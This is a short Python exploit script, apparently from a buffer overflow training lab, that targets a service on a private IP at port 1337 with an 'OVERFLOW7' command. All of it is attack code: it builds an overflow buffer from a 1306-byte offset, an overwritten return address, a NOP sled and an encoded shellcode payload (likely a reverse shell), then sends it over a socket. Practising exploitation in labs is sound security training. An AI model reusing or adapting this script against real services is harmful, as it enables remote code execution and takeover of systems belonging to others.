#!/usr/bin/env python3
import socket

ip = "10.10.39.227"
port = 1337

prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x36\x02\x22\x11\x83\xee\xfc\xe2\xf4\xca\xea\xa0\x11"
"\x36\x02\x42\x98\xd3\x33\xe2\x75\xbd\x52\x12\x9a\x64\x0e"
"\xa9\x43\x22\x89\x50\x39\x39\xb5\x68\x37\x07\xfd\x8e\x2d"
"\x57\x7e\x20\x3d\x16\xc3\xed\x1c\x37\xc5\xc0\xe3\x64\x55"
"\xa9\x43\x26\x89\x68\x2d\xbd\x4e\x33\x69\xd5\x4a\x23\xc0"
"\x67\x89\x7b\x31\x37\xd1\xa9\x58\x2e\xe1\x18\x58\xbd\x36"
"\xa9\x10\xe0\x33\xdd\xbd\xf7\xcd\x2f\x10\xf1\x3a\xc2\x64"
"\xc0\x01\x5f\xe9\x0d\x7f\x06\x64\xd2\x5a\xa9\x49\x12\x03"
"\xf1\x77\xbd\x0e\x69\x9a\x6e\x1e\x23\xc2\xbd\x06\xa9\x10"
"\xe6\x8b\x66\x35\x12\x59\x79\x70\x6f\x58\x73\xee\xd6\x5d"
"\x7d\x4b\xbd\x10\xc9\x9c\x6b\x6a\x11\x23\x36\x02\x4a\x66"
"\x45\x30\x7d\x45\x5e\x4e\x55\x37\x31\xfd\xf7\xa9\xa6\x03"
"\x22\x11\x1f\xc6\x76\x41\x5e\x2b\xa2\x7a\x36\xfd\xf7\x41"
"\x66\x52\x72\x51\x66\x42\x72\x79\xdc\x0d\xfd\xf1\xc9\xd7"
"\xb5\x7b\x33\x6a\x28\x17\x21\x03\x4a\x13\x36\x13\x7e\x98"
"\xd0\x68\x32\x47\x61\x6a\xbb\xb4\x42\x63\xdd\xc4\xb3\xc2"
"\x56\x1d\xc9\x4c\x2a\x64\xda\x6a\xd2\xa4\x94\x54\xdd\xc4"
"\x5e\x61\x4f\x75\x36\x8b\xc1\x46\x61\x55\x13\xe7\x5c\x10"
"\x7b\x47\xd4\xff\x44\xd6\x72\x26\x1e\x10\x37\x8f\x66\x35"
"\x26\xc4\x22\x55\x62\x52\x74\x47\x60\x44\x74\x5f\x60\x54"
"\x71\x47\x5e\x7b\xee\x2e\xb0\xfd\xf7\x98\xd6\x4c\x74\x57"
"\xc9\x32\x4a\x19\xb1\x1f\x42\xee\xe3\xb9\xc2\x0c\x1c\x08"
"\x4a\xb7\xa3\xbf\xbf\xee\xe3\x3e\x24\x6d\x3c\x82\xd9\xf1"
"\x43\x07\x99\x56\x25\x70\x4d\x7b\x36\x51\xdd\xc4")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
